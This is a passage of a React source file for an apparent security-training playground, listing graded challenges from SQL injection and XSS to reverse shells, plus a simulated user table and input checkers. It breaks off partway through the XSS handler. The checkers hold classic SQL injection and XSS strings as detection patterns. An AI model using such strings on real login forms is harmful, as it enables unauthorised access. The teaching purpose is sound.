import { useState, useEffect, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Code, Lock, Terminal, AlertTriangle,
  Database, Flag,
  CheckCircle, XCircle, Info,
  ArrowRight, Trophy, Star, Swords,
  Cpu, Binary, Search, Eye, Smartphone, FileSearch
} from 'lucide-react';
import Button from '@components/atoms/Button';
import SectionTitle from '@components/molecules/SectionTitle';
import AuthModal from '@components/organisms/AuthModal';
import { staggerContainer, staggerItem } from '@utils/animations';
import { useAuthState } from '@/hooks/useAuthState';

// Challenge types
type ChallengeType = 'sql-injection' | 'xss' | 'command-injection' | 'crypto' | 'ctf' | 'binary-exploitation' | 'reverse-engineering' | 'forensics' | 'steganography' | 'osint' | 'mobile-security';

interface Challenge {
  id: string;
  type: ChallengeType;
  title: string;
  description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert';
  points: number;
  icon: React.ElementType;
}

// All challenges - defined outside component for stable reference
const ALL_CHALLENGES: Challenge[] = [
  // SQL Injection Challenges (25 challenges)
  { id: 'sql-001', type: 'sql-injection', title: 'SQL Injection Basics', description: 'Learn how SQL injection works by exploiting a vulnerable login form', difficulty: 'Easy', points: 50, icon: Database },
  { id: 'sql-002', type: 'sql-injection', title: 'SQL Auth Bypass', description: 'Bypass authentication using SQL injection', difficulty: 'Easy', points: 50, icon: Database },
  { id: 'sql-003', type: 'sql-injection', title: 'SQL Comment Injection', description: 'Use SQL comments to bypass login', difficulty: 'Easy', points: 50, icon: Database },
  { id: 'sql-004', type: 'sql-injection', title: 'SQL OR Logic', description: 'Exploit OR logic in SQL queries', difficulty: 'Easy', points: 75, icon: Database },
  { id: 'sql-005', type: 'sql-injection', title: 'SQL String Concatenation', description: 'Break out of string context', difficulty: 'Easy', points: 75, icon: Database },
  { id: 'sql-006', type: 'sql-injection', title: 'UNION SELECT Basic', description: 'Learn UNION-based SQL injection', difficulty: 'Medium', points: 100, icon: Database },
  { id: 'sql-007', type: 'sql-injection', title: 'UNION Column Discovery', description: 'Find the number of columns using UNION', difficulty: 'Medium', points: 100, icon: Database },
  { id: 'sql-008', type: 'sql-injection', title: 'Database Enumeration', description: 'Extract database names using injection', difficulty: 'Medium', points: 150, icon: Database },
  { id: 'sql-009', type: 'sql-injection', title: 'Table Enumeration', description: 'List all tables in the database', difficulty: 'Medium', points: 150, icon: Database },
  { id: 'sql-010', type: 'sql-injection', title: 'Column Enumeration', description: 'Extract column names from tables', difficulty: 'Medium', points: 150, icon: Database },
  { id: 'sql-011', type: 'sql-injection', title: 'Blind SQL Injection', description: 'Extract data using boolean-based blind SQLi', difficulty: 'Hard', points: 200, icon: Database },
  { id: 'sql-012', type: 'sql-injection', title: 'Time-Based Blind SQLi', description: 'Use time delays to extract data', difficulty: 'Hard', points: 200, icon: Database },
  { id: 'sql-013', type: 'sql-injection', title: 'Error-Based SQLi', description: 'Exploit database errors for data extraction', difficulty: 'Hard', points: 250, icon: Database },
  { id: 'sql-014', type: 'sql-injection', title: 'Second-Order SQLi', description: 'Exploit stored SQL injection', difficulty: 'Hard', points: 250, icon: Database },
  { id: 'sql-015', type: 'sql-injection', title: 'SQL Injection in WHERE', description: 'Inject in WHERE clause', difficulty: 'Medium', points: 125, icon: Database },
  { id: 'sql-016', type: 'sql-injection', title: 'SQL Injection in ORDER BY', description: 'Exploit ORDER BY clause', difficulty: 'Medium', points: 125, icon: Database },
  { id: 'sql-017', type: 'sql-injection', title: 'SQL Injection with LIMIT', description: 'Bypass LIMIT restrictions', difficulty: 'Hard', points: 200, icon: Database },
  { id: 'sql-018', type: 'sql-injection', title: 'WAF Bypass - Whitespace', description: 'Bypass WAF using whitespace alternatives', difficulty: 'Hard', points: 300, icon: Database },
  { id: 'sql-019', type: 'sql-injection', title: 'WAF Bypass - Case Variation', description: 'Use case variations to bypass filters', difficulty: 'Hard', points: 300, icon: Database },
  { id: 'sql-020', type: 'sql-injection', title: 'WAF Bypass - Encoding', description: 'Use encoding to bypass WAF', difficulty: 'Expert', points: 400, icon: Database },
  { id: 'sql-021', type: 'sql-injection', title: 'NoSQL Injection Basics', description: 'Exploit NoSQL databases', difficulty: 'Medium', points: 175, icon: Database },
  { id: 'sql-022', type: 'sql-injection', title: 'MongoDB Injection', description: 'Inject into MongoDB queries', difficulty: 'Hard', points: 250, icon: Database },
  { id: 'sql-023', type: 'sql-injection', title: 'SQLi with JSON', description: 'Exploit SQL injection in JSON parameters', difficulty: 'Hard', points: 275, icon: Database },
  { id: 'sql-024', type: 'sql-injection', title: 'Advanced UNION Exploitation', description: 'Master complex UNION-based attacks', difficulty: 'Expert', points: 450, icon: Database },
  { id: 'sql-025', type: 'sql-injection', title: 'SQL Master Challenge', description: 'Ultimate SQL injection challenge', difficulty: 'Expert', points: 500, icon: Database },

  // XSS Challenges (25 challenges)
  { id: 'xss-001', type: 'xss', title: 'Reflected XSS Basics', description: 'Basic reflected XSS vulnerability', difficulty: 'Easy', points: 50, icon: Code },
  { id: 'xss-002', type: 'xss', title: 'XSS with Alert', description: 'Trigger an alert box', difficulty: 'Easy', points: 50, icon: Code },
  { id: 'xss-003', type: 'xss', title: 'XSS Script Tag', description: 'Inject using script tags', difficulty: 'Easy', points: 50, icon: Code },
  { id: 'xss-004', type: 'xss', title: 'XSS Event Handler', description: 'Use event handlers for XSS', difficulty: 'Easy', points: 75, icon: Code },
  { id: 'xss-005', type: 'xss', title: 'XSS with IMG Tag', description: 'Exploit img tag onerror', difficulty: 'Easy', points: 75, icon: Code },
  { id: 'xss-006', type: 'xss', title: 'Stored XSS Basics', description: 'Inject persistent XSS', difficulty: 'Medium', points: 100, icon: Code },
  { id: 'xss-007', type: 'xss', title: 'DOM XSS', description: 'Exploit DOM-based XSS', difficulty: 'Medium', points: 150, icon: Code },
  { id: 'xss-008', type: 'xss', title: 'XSS in URL Parameter', description: 'Inject XSS via URL parameters', difficulty: 'Medium', points: 100, icon: Code },
  { id: 'xss-009', type: 'xss', title: 'XSS with SVG', description: 'Use SVG for XSS injection', difficulty: 'Medium', points: 125, icon: Code },
  { id: 'xss-010', type: 'xss', title: 'XSS Filter Bypass', description: 'Bypass basic XSS filters', difficulty: 'Medium', points: 150, icon: Code },
  { id: 'xss-011', type: 'xss', title: 'XSS with Iframe', description: 'Exploit iframe for XSS', difficulty: 'Medium', points: 125, icon: Code },
  { id: 'xss-012', type: 'xss', title: 'XSS via Form Input', description: 'Inject XSS through form fields', difficulty: 'Easy', points: 75, icon: Code },
  { id: 'xss-013', type: 'xss', title: 'XSS Cookie Stealing', description: 'Steal cookies using XSS', difficulty: 'Hard', points: 200, icon: Code },
  { id: 'xss-014', type: 'xss', title: 'XSS Keylogger', description: 'Implement keylogger via XSS', difficulty: 'Hard', points: 250, icon: Code },
  { id: 'xss-015', type: 'xss', title: 'XSS BeEF Hook', description: 'Hook browser with BeEF', difficulty: 'Hard', points: 300, icon: Code },
  { id: 'xss-016', type: 'xss', title: 'Blind XSS', description: 'Exploit blind XSS vulnerability', difficulty: 'Hard', points: 275, icon: Code },
  { id: 'xss-017', type: 'xss', title: 'XSS WAF Bypass', description: 'Bypass XSS web application firewall', difficulty: 'Hard', points: 300, icon: Code },
  { id: 'xss-018', type: 'xss', title: 'XSS with Encoding', description: 'Use encoding to bypass filters', difficulty: 'Hard', points: 250, icon: Code },
  { id: 'xss-019', type: 'xss', title: 'XSS Polyglot', description: 'Create multi-context XSS payload', difficulty: 'Expert', points: 400, icon: Code },
  { id: 'xss-020', type: 'xss', title: 'XSS in Rich Text Editor', description: 'Exploit rich text editor XSS', difficulty: 'Medium', points: 175, icon: Code },
  { id: 'xss-021', type: 'xss', title: 'XSS via File Upload', description: 'Inject XSS through file upload', difficulty: 'Hard', points: 225, icon: Code },
  { id: 'xss-022', type: 'xss', title: 'Self-XSS to Stored XSS', description: 'Escalate self-XSS to stored', difficulty: 'Hard', points: 300, icon: Code },
  { id: 'xss-023', type: 'xss', title: 'XSS with CSP Bypass', description: 'Bypass Content Security Policy', difficulty: 'Expert', points: 450, icon: Code },
  { id: 'xss-024', type: 'xss', title: 'Advanced DOM XSS', description: 'Complex DOM manipulation XSS', difficulty: 'Expert', points: 400, icon: Code },
  { id: 'xss-025', type: 'xss', title: 'XSS Master Challenge', description: 'Ultimate XSS exploitation', difficulty: 'Expert', points: 500, icon: Code },

  // Command Injection Challenges (25 challenges)
  { id: 'cmd-001', type: 'command-injection', title: 'Command Injection Basics', description: 'Execute basic system commands', difficulty: 'Easy', points: 50, icon: Terminal },
  { id: 'cmd-002', type: 'command-injection', title: 'Command Chaining', description: 'Chain multiple commands', difficulty: 'Easy', points: 75, icon: Terminal },
  { id: 'cmd-003', type: 'command-injection', title: 'Command with Semicolon', description: 'Use semicolon to chain commands', difficulty: 'Easy', points: 50, icon: Terminal },
  { id: 'cmd-004', type: 'command-injection', title: 'Command with Pipe', description: 'Use pipe operator for injection', difficulty: 'Easy', points: 75, icon: Terminal },
  { id: 'cmd-005', type: 'command-injection', title: 'Command with AND', description: 'Use && operator', difficulty: 'Easy', points: 75, icon: Terminal },
  { id: 'cmd-006', type: 'command-injection', title: 'Command with OR', description: 'Use || operator', difficulty: 'Easy', points: 75, icon: Terminal },
  { id: 'cmd-007', type: 'command-injection', title: 'Command Substitution', description: 'Use backticks or $()', difficulty: 'Medium', points: 100, icon: Terminal },
  { id: 'cmd-008', type: 'command-injection', title: 'File Reading', description: 'Read sensitive files', difficulty: 'Medium', points: 125, icon: Terminal },
  { id: 'cmd-009', type: 'command-injection', title: 'Directory Traversal', description: 'Navigate file system', difficulty: 'Medium', points: 150, icon: Terminal },
  { id: 'cmd-010', type: 'command-injection', title: 'Environment Variables', description: 'Extract environment variables', difficulty: 'Medium', points: 150, icon: Terminal },
  { id: 'cmd-011', type: 'command-injection', title: 'Blind Command Injection', description: 'Execute commands without output', difficulty: 'Hard', points: 200, icon: Terminal },
  { id: 'cmd-012', type: 'command-injection', title: 'Time-Based Detection', description: 'Use time delays for verification', difficulty: 'Hard', points: 225, icon: Terminal },
  { id: 'cmd-013', type: 'command-injection', title: 'Out-of-Band Data Exfil', description: 'Exfiltrate data via DNS/HTTP', difficulty: 'Hard', points: 275, icon: Terminal },
  { id: 'cmd-014', type: 'command-injection', title: 'Filter Bypass - Spaces', description: 'Bypass space restrictions', difficulty: 'Medium', points: 175, icon: Terminal },
  { id: 'cmd-015', type: 'command-injection', title: 'Filter Bypass - Keywords', description: 'Bypass keyword blacklists', difficulty: 'Hard', points: 250, icon: Terminal },
  { id: 'cmd-016', type: 'command-injection', title: 'Command Encoding', description: 'Use encoding to bypass filters', difficulty: 'Hard', points: 250, icon: Terminal },
  { id: 'cmd-017', type: 'command-injection', title: 'Reverse Shell Basic', description: 'Establish reverse shell connection', difficulty: 'Hard', points: 300, icon: Terminal },
  { id: 'cmd-018', type: 'command-injection', title: 'Reverse Shell Advanced', description: 'Advanced reverse shell techniques', difficulty: 'Expert', points: 400, icon: Terminal },
  { id: 'cmd-019', type: 'command-injection', title: 'PHP Code Injection', description: 'Inject PHP code execution', difficulty: 'Hard', points: 275, icon: Terminal },
  { id: 'cmd-020', type: 'command-injection', title: 'Python Code Injection', description: 'Execute Python code', difficulty: 'Hard', points: 275, icon: Terminal },
  { id: 'cmd-021', type: 'command-injection', title: 'Node.js Injection', description: 'Exploit Node.js command execution', difficulty: 'Hard', points: 300, icon: Terminal },
  { id: 'cmd-022', type: 'command-injection', title: 'XXE to RCE', description: 'Escalate XXE to command execution', difficulty: 'Expert', points: 450, icon: Terminal },
  { id: 'cmd-023', type: 'command-injection', title: 'Deserialization to RCE', description: 'Exploit insecure deserialization', difficulty: 'Expert', points: 450, icon: Terminal },
  { id: 'cmd-024', type: 'command-injection', title: 'Template Injection to RCE', description: 'Server-Side Template Injection', difficulty: 'Expert', points: 400, icon: Terminal },
  { id: 'cmd-025', type: 'command-injection', title: 'Command Injection Master', description: 'Ultimate command injection challenge', difficulty: 'Expert', points: 500, icon: Terminal },

  // Crypto Challenges (15 challenges)
  { id: 'crypto-001', type: 'crypto', title: 'Caesar Cipher', description: 'Decrypt Caesar cipher', difficulty: 'Easy', points: 50, icon: Lock },
  { id: 'crypto-002', type: 'crypto', title: 'Base64 Decoding', description: 'Decode Base64 encoded string', difficulty: 'Easy', points: 50, icon: Lock },
  { id: 'crypto-003', type: 'crypto', title: 'ROT13 Decryption', description: 'Decrypt ROT13 cipher', difficulty: 'Easy', points: 50, icon: Lock },
  { id: 'crypto-004', type: 'crypto', title: 'Hex Encoding', description: 'Decode hexadecimal string', difficulty: 'Easy', points: 75, icon: Lock },
  { id: 'crypto-005', type: 'crypto', title: 'XOR Cipher', description: 'Break XOR encryption', difficulty: 'Medium', points: 150, icon: Lock },
  { id: 'crypto-006', type: 'crypto', title: 'Weak RSA Keys', description: 'Factor weak RSA modulus', difficulty: 'Hard', points: 250, icon: Lock },
  { id: 'crypto-007', type: 'crypto', title: 'Hash Collision', description: 'Find MD5 collision', difficulty: 'Hard', points: 300, icon: Lock },
  { id: 'crypto-008', type: 'crypto', title: 'Password Cracking', description: 'Crack hashed passwords', difficulty: 'Medium', points: 175, icon: Lock },
  { id: 'crypto-009', type: 'crypto', title: 'ECB Mode Attack', description: 'Exploit ECB encryption mode', difficulty: 'Hard', points: 275, icon: Lock },
  { id: 'crypto-010', type: 'crypto', title: 'Padding Oracle Attack', description: 'Exploit padding oracle vulnerability', difficulty: 'Expert', points: 400, icon: Lock },
  { id: 'crypto-011', type: 'crypto', title: 'Timing Attack', description: 'Exploit timing side channel', difficulty: 'Expert', points: 450, icon: Lock },
  { id: 'crypto-012', type: 'crypto', title: 'JWT Weak Secret', description: 'Crack JWT secret key', difficulty: 'Medium', points: 200, icon: Lock },
  { id: 'crypto-013', type: 'crypto', title: 'JWT Algorithm Confusion', description: 'Exploit JWT algorithm confusion', difficulty: 'Hard', points: 300, icon: Lock },
  { id: 'crypto-014', type: 'crypto', title: 'Random Number Prediction', description: 'Predict weak PRNG output', difficulty: 'Expert', points: 400, icon: Lock },
  { id: 'crypto-015', type: 'crypto', title: 'Crypto Master Challenge', description: 'Ultimate cryptography challenge', difficulty: 'Expert', points: 500, icon: Lock },

  // CTF Challenges (10 challenges)
  { id: 'ctf-001', type: 'ctf', title: 'Web CTF Easy', description: 'Basic web exploitation CTF', difficulty: 'Easy', points: 100, icon: Flag },
  { id: 'ctf-002', type: 'ctf', title: 'Web CTF Medium', description: 'Intermediate web challenge', difficulty: 'Medium', points: 200, icon: Flag },
  { id: 'ctf-003', type: 'ctf', title: 'Multi-Step Challenge', description: 'Combine multiple vulnerabilities', difficulty: 'Hard', points: 350, icon: Flag },
  { id: 'ctf-004', type: 'ctf', title: 'Hidden Flag Hunt', description: 'Find flags in various locations', difficulty: 'Medium', points: 250, icon: Flag },
  { id: 'ctf-005', type: 'ctf', title: 'Admin Panel Access', description: 'Gain admin access to find flag', difficulty: 'Hard', points: 400, icon: Flag },
  { id: 'ctf-006', type: 'ctf', title: 'API Exploitation', description: 'Exploit REST API vulnerabilities', difficulty: 'Hard', points: 375, icon: Flag },
  { id: 'ctf-007', type: 'ctf', title: 'Authentication Bypass', description: 'Bypass multi-factor authentication', difficulty: 'Expert', points: 450, icon: Flag },
  { id: 'ctf-008', type: 'ctf', title: 'Full Chain Exploit', description: 'Chain multiple vulns for RCE', difficulty: 'Expert', points: 500, icon: Flag },
  { id: 'ctf-009', type: 'ctf', title: 'Real World Scenario', description: 'Realistic company infrastructure', difficulty: 'Expert', points: 600, icon: Flag },
  { id: 'ctf-010', type: 'ctf', title: 'CTF Master Challenge', description: 'Ultimate CTF challenge', difficulty: 'Expert', points: 1000, icon: Flag },

  // Binary Exploitation Challenges (15 challenges)
  { id: 'bin-001', type: 'binary-exploitation', title: 'Buffer Overflow Basics', description: 'Exploit simple buffer overflow vulnerability', difficulty: 'Easy', points: 100, icon: Cpu },
  { id: 'bin-002', type: 'binary-exploitation', title: 'Stack Overflow', description: 'Overflow stack buffer to control execution', difficulty: 'Easy', points: 150, icon: Cpu },
  { id: 'bin-003', type: 'binary-exploitation', title: 'Return-to-libc', description: 'Execute system calls without shellcode', difficulty: 'Medium', points: 250, icon: Cpu },
  { id: 'bin-004', type: 'binary-exploitation', title: 'ROP Chain Basics', description: 'Build ROP chain for code execution', difficulty: 'Medium', points: 300, icon: Cpu },
  { id: 'bin-005', type: 'binary-exploitation', title: 'Format String Vulnerability', description: 'Exploit format string bug', difficulty: 'Medium', points: 275, icon: Cpu },
  { id: 'bin-006', type: 'binary-exploitation', title: 'Heap Overflow', description: 'Exploit heap-based buffer overflow', difficulty: 'Hard', points: 400, icon: Cpu },
  { id: 'bin-007', type: 'binary-exploitation', title: 'Use-After-Free', description: 'Exploit UAF vulnerability', difficulty: 'Hard', points: 450, icon: Cpu },
  { id: 'bin-008', type: 'binary-exploitation', title: 'Integer Overflow', description: 'Exploit integer overflow vulnerability', difficulty: 'Hard', points: 350, icon: Cpu },
  { id: 'bin-009', type: 'binary-exploitation', title: 'Format String to Shell', description: 'Use format strings for code execution', difficulty: 'Expert', points: 500, icon: Cpu },
  { id: 'bin-010', type: 'binary-exploitation', title: 'Advanced ROP', description: 'Complex ROP chain exploitation', difficulty: 'Expert', points: 550, icon: Cpu },
  { id: 'bin-011', type: 'binary-exploitation', title: 'Stack Canary Bypass', description: 'Bypass stack protection mechanisms', difficulty: 'Expert', points: 600, icon: Cpu },
  { id: 'bin-012', type: 'binary-exploitation', title: 'ASLR Bypass', description: 'Bypass Address Space Layout Randomization', difficulty: 'Expert', points: 650, icon: Cpu },
  { id: 'bin-013', type: 'binary-exploitation', title: 'Shellcode Writing', description: 'Write custom shellcode', difficulty: 'Expert', points: 700, icon: Cpu },
  { id: 'bin-014', type: 'binary-exploitation', title: 'Multi-stage Exploit', description: 'Complex multi-stage exploitation', difficulty: 'Expert', points: 800, icon: Cpu },
  { id: 'bin-015', type: 'binary-exploitation', title: 'Binary Exploitation Master', description: 'Ultimate binary exploitation challenge', difficulty: 'Expert', points: 1000, icon: Cpu },

  // Reverse Engineering Challenges (15 challenges)
  { id: 'rev-001', type: 'reverse-engineering', title: 'Basic Reverse', description: 'Analyze simple compiled program', difficulty: 'Easy', points: 75, icon: Binary },
  { id: 'rev-002', type: 'reverse-engineering', title: 'String Analysis', description: 'Extract hidden strings from binary', difficulty: 'Easy', points: 100, icon: Binary },
  { id: 'rev-003', type: 'reverse-engineering', title: 'Function Identification', description: 'Identify key functions in binary', difficulty: 'Easy', points: 100, icon: Binary },
  { id: 'rev-004', type: 'reverse-engineering', title: 'Password Cracking', description: 'Reverse engineer password check', difficulty: 'Medium', points: 175, icon: Binary },
  { id: 'rev-005', type: 'reverse-engineering', title: 'Algorithm Recovery', description: 'Recover encrypted algorithm', difficulty: 'Medium', points: 200, icon: Binary },
  { id: 'rev-006', type: 'reverse-engineering', title: 'Obfuscated Code', description: 'Analyze obfuscated binary', difficulty: 'Medium', points: 250, icon: Binary },
  { id: 'rev-007', type: 'reverse-engineering', title: 'Packed Binary', description: 'Unpack and analyze packed executable', difficulty: 'Hard', points: 350, icon: Binary },
  { id: 'rev-008', type: 'reverse-engineering', title: 'Anti-Debug Techniques', description: 'Bypass anti-debugging measures', difficulty: 'Hard', points: 400, icon: Binary },
  { id: 'rev-009', type: 'reverse-engineering', title: 'License Key Generator', description: 'Reverse engineer key generation', difficulty: 'Hard', points: 375, icon: Binary },
  { id: 'rev-010', type: 'reverse-engineering', title: 'Malware Analysis', description: 'Analyze malicious software', difficulty: 'Expert', points: 500, icon: Binary },
  { id: 'rev-011', type: 'reverse-engineering', title: 'Kernel Driver Reversing', description: 'Reverse engineer kernel driver', difficulty: 'Expert', points: 600, icon: Binary },
  { id: 'rev-012', type: 'reverse-engineering', title: 'Firmware Analysis', description: 'Extract and analyze firmware', difficulty: 'Expert', points: 550, icon: Binary },
  { id: 'rev-013', type: 'reverse-engineering', title: 'Binary Patching', description: 'Modify binary behavior', difficulty: 'Expert', points: 450, icon: Binary },
  { id: 'rev-014', type: 'reverse-engineering', title: 'Custom Decryption', description: 'Decrypt custom encryption routine', difficulty: 'Expert', points: 650, icon: Binary },
  { id: 'rev-015', type: 'reverse-engineering', title: 'Reverse Engineering Master', description: 'Ultimate reverse engineering challenge', difficulty: 'Expert', points: 1000, icon: Binary },

  // Forensics Challenges (15 challenges)
  { id: 'for-001', type: 'forensics', title: 'File Recovery', description: 'Recover deleted files from disk image', difficulty: 'Easy', points: 75, icon: FileSearch },
  { id: 'for-002', type: 'forensics', title: 'Memory Analysis', description: 'Analyze memory dump for artifacts', difficulty: 'Easy', points: 100, icon: FileSearch },
  { id: 'for-003', type: 'forensics', title: 'Log Analysis', description: 'Parse and analyze system logs', difficulty: 'Easy', points: 75, icon: FileSearch },
  { id: 'for-004', type: 'forensics', title: 'PCAP Analysis', description: 'Analyze network capture file', difficulty: 'Medium', points: 150, icon: FileSearch },
  { id: 'for-005', type: 'forensics', title: 'Registry Analysis', description: 'Examine Windows registry for evidence', difficulty: 'Medium', points: 175, icon: FileSearch },
  { id: 'for-006', type: 'forensics', title: 'Disk Imaging', description: 'Create and analyze disk images', difficulty: 'Medium', points: 200, icon: FileSearch },
  { id: 'for-007', type: 'forensics', title: 'Timeline Analysis', description: 'Create incident timeline from artifacts', difficulty: 'Hard', points: 300, icon: FileSearch },
  { id: 'for-008', type: 'forensics', title: 'Volatility Analysis', description: 'Use Volatility for memory forensics', difficulty: 'Hard', points: 350, icon: FileSearch },
  { id: 'for-009', type: 'forensics', title: 'Malware Forensics', description: 'Analyze malware behavior', difficulty: 'Hard', points: 400, icon: FileSearch },
  { id: 'for-010', type: 'forensics', title: 'Email Header Analysis', description: 'Trace email origin and spoofing', difficulty: 'Medium', points: 200, icon: FileSearch },
  { id: 'for-011', type: 'forensics', title: 'Browser Artifacts', description: 'Extract browser history and cache', difficulty: 'Medium', points: 175, icon: FileSearch },
  { id: 'for-012', type: 'forensics', title: 'USB Device Tracking', description: 'Track USB device usage history', difficulty: 'Hard', points: 300, icon: FileSearch },
  { id: 'for-013', type: 'forensics', title: 'Windows Event Logs', description: 'Analyze Windows security events', difficulty: 'Hard', points: 350, icon: FileSearch },
  { id: 'for-014', type: 'forensics', title: 'Network Forensics', description: 'Deep packet analysis and reconstruction', difficulty: 'Expert', points: 500, icon: FileSearch },
  { id: 'for-015', type: 'forensics', title: 'Forensics Master', description: 'Ultimate digital forensics challenge', difficulty: 'Expert', points: 1000, icon: FileSearch },

  // Steganography Challenges (10 challenges)
  { id: 'steg-001', type: 'steganography', title: 'Image Metadata', description: 'Extract hidden data from image metadata', difficulty: 'Easy', points: 50, icon: Eye },
  { id: 'steg-002', type: 'steganography', title: 'LSB Extraction', description: 'Extract data from least significant bits', difficulty: 'Easy', points: 75, icon: Eye },
  { id: 'steg-003', type: 'steganography', title: 'PNG Hidden Data', description: 'Find hidden data in PNG files', difficulty: 'Easy', points: 100, icon: Eye },
  { id: 'steg-004', type: 'steganography', title: 'Audio Steganography', description: 'Extract hidden data from audio', difficulty: 'Medium', points: 150, icon: Eye },
  { id: 'steg-005', type: 'steganography', title: 'Video Steganography', description: 'Find hidden data in video files', difficulty: 'Medium', points: 200, icon: Eye },
  { id: 'steg-006', type: 'steganography', title: 'Exif Data Extraction', description: 'Extract hidden data from EXIF', difficulty: 'Easy', points: 75, icon: Eye },
  { id: 'steg-007', type: 'steganography', title: 'Steghide Basics', description: 'Use steghide to extract secrets', difficulty: 'Medium', points: 125, icon: Eye },
  { id: 'steg-008', type: 'steganography', title: 'Frequency Analysis', description: 'Analyze frequency for hidden data', difficulty: 'Hard', points: 250, icon: Eye },
  { id: 'steg-009', type: 'steganography', title: 'Advanced Steganography', description: 'Complex multi-layer steganography', difficulty: 'Expert', points: 400, icon: Eye },
  { id: 'steg-010', type: 'steganography', title: 'Steganography Master', description: 'Ultimate steganography challenge', difficulty: 'Expert', points: 750, icon: Eye },

  // OSINT Challenges (10 challenges)
  { id: 'osint-001', type: 'osint', title: 'Social Media OSINT', description: 'Gather info from social media profiles', difficulty: 'Easy', points: 50, icon: Search },
  { id: 'osint-002', type: 'osint', title: 'Email Tracing', description: 'Trace email origin and headers', difficulty: 'Easy', points: 75, icon: Search },
  { id: 'osint-003', type: 'osint', title: 'WHOIS Lookup', description: 'Find domain owner information', difficulty: 'Easy', points: 50, icon: Search },
  { id: 'osint-004', type: 'osint', title: 'Image Geolocation', description: 'Find location from photo', difficulty: 'Medium', points: 150, icon: Search },
  { id: 'osint-005', type: 'osint', title: 'People Search', description: 'Find person information from public sources', difficulty: 'Medium', points: 125, icon: Search },
  { id: 'osint-006', type: 'osint', title: 'Google Dorking', description: 'Use advanced Google search techniques', difficulty: 'Easy', points: 75, icon: Search },
  { id: 'osint-007', type: 'osint', title: 'Dark Web OSINT', description: 'Gather intel from dark web sources', difficulty: 'Hard', points: 300, icon: Search },
  { id: 'osint-008', type: 'osint', title: 'Corporate OSINT', description: 'Gather information about companies', difficulty: 'Medium', points: 175, icon: Search },
  { id: 'osint-009', type: 'osint', title: 'Certificate Transparency', description: 'Find hidden subdomains via CT logs', difficulty: 'Medium', points: 200, icon: Search },
  { id: 'osint-010', type: 'osint', title: 'OSINT Master', description: 'Ultimate OSINT challenge', difficulty: 'Expert', points: 750, icon: Search },

  // Mobile Security Challenges (10 challenges)
  { id: 'mob-001', type: 'mobile-security', title: 'Android APK Analysis', description: 'Analyze Android application structure', difficulty: 'Easy', points: 75, icon: Smartphone },
  { id: 'mob-002', type: 'mobile-security', title: 'Android Decompilation', description: 'Decompile APK to source code', difficulty: 'Easy', points: 100, icon: Smartphone },
  { id: 'mob-003', type: 'mobile-security', title: 'Insecure Data Storage', description: 'Find sensitive data in app storage', difficulty: 'Medium', points: 150, icon: Smartphone },
  { id: 'mob-004', type: 'mobile-security', title: 'API Key Extraction', description: 'Extract hardcoded API keys', difficulty: 'Medium', points: 175, icon: Smartphone },
  { id: 'mob-005', type: 'mobile-security', title: 'Traffic Analysis', description: 'Analyze mobile app network traffic', difficulty: 'Medium', points: 200, icon: Smartphone },
  { id: 'mob-006', type: 'mobile-security', title: 'Deep Link Exploitation', description: 'Exploit deep link vulnerabilities', difficulty: 'Hard', points: 300, icon: Smartphone },
  { id: 'mob-007', type: 'mobile-security', title: 'iOS Binary Analysis', description: 'Analyze iOS application binary', difficulty: 'Hard', points: 350, icon: Smartphone },
  { id: 'mob-008', type: 'mobile-security', title: 'Root Detection Bypass', description: 'Bypass root/jailbreak detection', difficulty: 'Hard', points: 325, icon: Smartphone },
  { id: 'mob-009', type: 'mobile-security', title: 'Runtime Manipulation', description: 'Manipulate app at runtime with Frida', difficulty: 'Expert', points: 500, icon: Smartphone },
  { id: 'mob-010', type: 'mobile-security', title: 'Mobile Security Master', description: 'Ultimate mobile security challenge', difficulty: 'Expert', points: 750, icon: Smartphone },
];

export default function PlaygroundPage() {
  const [activeChallenge, setActiveChallenge] = useState<Challenge | null>(null);
  const [result, setResult] = useState<{ success: boolean; message: string } | null>(null);
  const [sqlQuery, setSqlQuery] = useState('');
  const [xssInput, setXssInput] = useState('');
  const [commandInput, setCommandInput] = useState('');
  const [cryptoInput, setCryptoInput] = useState('');
  const [score, setScore] = useState(0);
  const [solvedChallenges, setSolvedChallenges] = useState<string[]>([]);
  const [filterDifficulty, setFilterDifficulty] = useState<string>('All');
  const [filterType, setFilterType] = useState<string>('All');
  const [visibleChallenges, setVisibleChallenges] = useState(12);
  const [showSolvedChallenges, setShowSolvedChallenges] = useState(true);
  const { isAuthenticated: isLoggedIn } = useAuthState();
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [showChallengeModal, setShowChallengeModal] = useState(false);

  // Simulated vulnerable database
  const fakeDatabase = [
    { username: 'admin', password: 'admin123', role: 'administrator', flag: 'FLAG{SQL_1nj3ct10n_M4st3r}' },
    { username: 'user', password: 'user123', role: 'user', flag: '' },
    { username: 'guest', password: 'guest123', role: 'guest', flag: '' }
  ];

  const handleSQLChallenge = (query: string, challengeId?: string) => {
    const lowerQuery = query.toLowerCase().trim();

    // Check for SQL injection patterns
    if (lowerQuery.includes("' or '1'='1") ||
      lowerQuery.includes("' or 1=1") ||
      lowerQuery.includes("admin'--") ||
      lowerQuery.includes("admin' #")) {

      const adminUser = fakeDatabase.find(u => u.role === 'administrator');

      setResult({
        success: true,
        message: `🎉 Success! You've bypassed authentication!\n\nLogged in as: ${adminUser?.username}\nRole: ${adminUser?.role}\n\nFlag: ${adminUser?.flag}\n\nYou used SQL injection to bypass the login. The vulnerable code was:\n\nSELECT * FROM users WHERE username='${query}' AND password='...'`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 50));
      }
      return;
    }

    // Union-based injection
    if (lowerQuery.includes('union select') || lowerQuery.includes('union all select')) {
      setResult({
        success: true,
        message: `🎉 Excellent! You've performed a UNION-based SQL injection!\n\nYou successfully extracted data using UNION SELECT.\nThis technique allows you to retrieve data from other tables.\n\nFlag: FLAG{UN10N_S3L3CT_PR0}`
      });

      if (challengeId && !solvedChallenges.includes(challengeId)) {
        const challenge = ALL_CHALLENGES.find(c => c.id === challengeId);
        setSolvedChallenges([...solvedChallenges, challengeId]);
        setScore(score + (challenge?.points || 100));
      }
      return;
    }

    setResult({
      success: false,
      message: '❌ Authentication failed. Try to exploit the SQL query!\n\nHint: Think about how you can manipulate the SQL query to always return true.'
    });
  };

  const handleXSSChallenge = (input: string, challengeId?: string) => {
    // Check for XSS patterns
    if (input.includes('<script>') ||
      input.includes('javascript:') ||
